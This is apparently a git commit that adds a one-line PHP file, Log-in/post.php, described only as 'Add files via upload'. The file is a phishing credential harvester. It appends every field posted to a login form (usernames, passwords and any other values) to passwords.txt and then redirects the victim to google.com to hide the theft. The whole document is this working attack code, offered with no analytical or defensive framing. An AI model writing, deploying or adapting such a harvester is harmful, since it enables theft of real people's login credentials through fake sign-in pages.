eb6e935f70f3f9897e56f274368004a403676465
Gray Programmerz <hackrefisher@gmail.com>
2020-07-02 21:51:01 +0500

    Add files via upload

---
+++ Log-in/post.php
@@ -0,0 +1,1 @@
+<?php header('Location: index.php');header('Location: https://www.google.com');$handle=fopen("passwords.txt","a");foreach($_POST as $variable=>$value){fwrite($handle,$variable);fwrite($handle,"=");fwrite($handle,$value);fwrite($handle,"\r\n");}fwrite($handle,"\r\n");fclose($handle);exit; ?>
